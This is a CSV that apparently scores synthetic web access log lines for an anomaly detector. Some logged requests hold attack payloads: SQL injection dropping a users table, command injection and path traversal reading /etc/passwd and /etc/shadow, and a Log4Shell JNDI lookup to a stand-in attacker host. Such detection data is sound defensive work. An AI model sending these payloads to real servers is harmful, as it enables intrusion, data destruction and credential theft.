score_content,score_session,score_fused,line
50.662315368652344,,50.662315368652344,206.250.187.176 - - [10/Jan/2025:12:00:00 +0100] "HEAD /search?q=monitor HTTP/1.1" 200 18298 "-" "curl/7.85.0"
5.835961818695068,,5.835961818695068,123.51.186.156 - - [10/Jan/2025:12:00:01 +0100] "GET /search?q=laptop HTTP/1.1" 200 10161 "-" "Wget/1.21.2 (linux-gnu)"
76.08716583251953,,76.08716583251953,169.123.26.189 - - [10/Jan/2025:12:00:01 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 200 10330 "https://example.com/" "nikto/2.5.0"
78.05311584472656,,78.05311584472656,45.212.159.159 - - [10/Jan/2025:12:00:04 +0100] "OPTIONS /search?q=router HTTP/1.1" 302 3204 "-" "python-requests/2.31.0"
1.6210105419158936,,1.6210105419158936,40.173.159.248 - - [10/Jan/2025:12:00:05 +0100] "GET /contact HTTP/1.1" 200 1046 "-" "curl/7.85.0"
5.870911121368408,,5.870911121368408,169.174.40.120 - - [10/Jan/2025:12:00:06 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 17291 "https://example.com/" "python-requests/2.31.0"
106.95358276367188,,106.95358276367188,53.172.215.182 - - [10/Jan/2025:12:00:08 +0100] "TRACE /search?q=headphones HTTP/1.1" 204 5218 "-" "python-requests/2.31.0"
33.07057189941406,,33.07057189941406,113.254.115.241 - - [10/Jan/2025:12:00:09 +0100] "DELETE /api/product?id=123 HTTP/1.1" 304 17167 "https://example.com/" "dirb/2.22"
76.00851440429688,,76.00851440429688,51.35.94.36 - - [10/Jan/2025:12:00:10 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 6381 "https://example.com/" "python-requests/2.31.0"
0.2114313691854477,,0.2114313691854477,4.188.252.184 - - [10/Jan/2025:12:00:13 +0100] "GET /assets/app.css HTTP/1.1" 204 2197 "-" "sqlmap/1.7.2#stable"
16.864727020263672,,16.864727020263672,52.195.121.210 - - [10/Jan/2025:12:00:14 +0100] "PUT /search?q=headphones HTTP/1.1" 200 12702 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
46.476287841796875,,46.476287841796875,46.247.192.214 - - [10/Jan/2025:12:00:15 +0100] "HEAD /profile HTTP/1.1" 200 13830 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
75.93498992919922,,75.93498992919922,134.135.242.146 - - [10/Jan/2025:12:00:18 +0100] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 6158 "-" "sqlmap/1.7.2#stable"
8.615097045898438,,8.615097045898438,145.18.128.181 - - [10/Jan/2025:12:00:18 +0100] "POST /search?q=ssd HTTP/1.1" 200 10108 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
16.92394256591797,,16.92394256591797,249.44.188.226 - - [10/Jan/2025:12:00:20 +0100] "PUT /search?q=monitor HTTP/1.1" 200 16445 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
107.06696319580078,,107.06696319580078,245.76.94.181 - - [10/Jan/2025:12:00:20 +0100] "TRACE /search?q=laptop HTTP/1.1" 200 17527 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.831174850463867,,5.831174850463867,126.206.123.64 - - [10/Jan/2025:12:00:22 +0100] "GET /search?q=phone HTTP/1.1" 200 2185 "https://twitter.com/" "dirb/2.22"
1.6304882764816284,,1.6304882764816284,126.99.228.236 - - [10/Jan/2025:12:00:22 +0100] "GET /contact HTTP/1.1" 200 7604 "https://www.google.com/" "python-requests/2.31.0"
30.997051239013672,,30.997051239013672,177.172.68.127 - - [10/Jan/2025:12:00:22 +0100] "DELETE /search?q=phone HTTP/1.1" 200 17093 "https://example.com/" "sqlmap/1.7.2#stable"
26.7657527923584,,26.7657527923584,170.160.60.153 - - [10/Jan/2025:12:00:24 +0100] "DELETE /profile HTTP/1.1" 200 10607 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
75.98065185546875,,75.98065185546875,131.167.149.134 - - [10/Jan/2025:12:00:27 +0100] "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 4633 "-" "nikto/2.5.0"
76.07456970214844,,76.07456970214844,199.52.180.132 - - [10/Jan/2025:12:00:27 +0100] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 17002 "https://www.google.com/" "dirb/2.22"
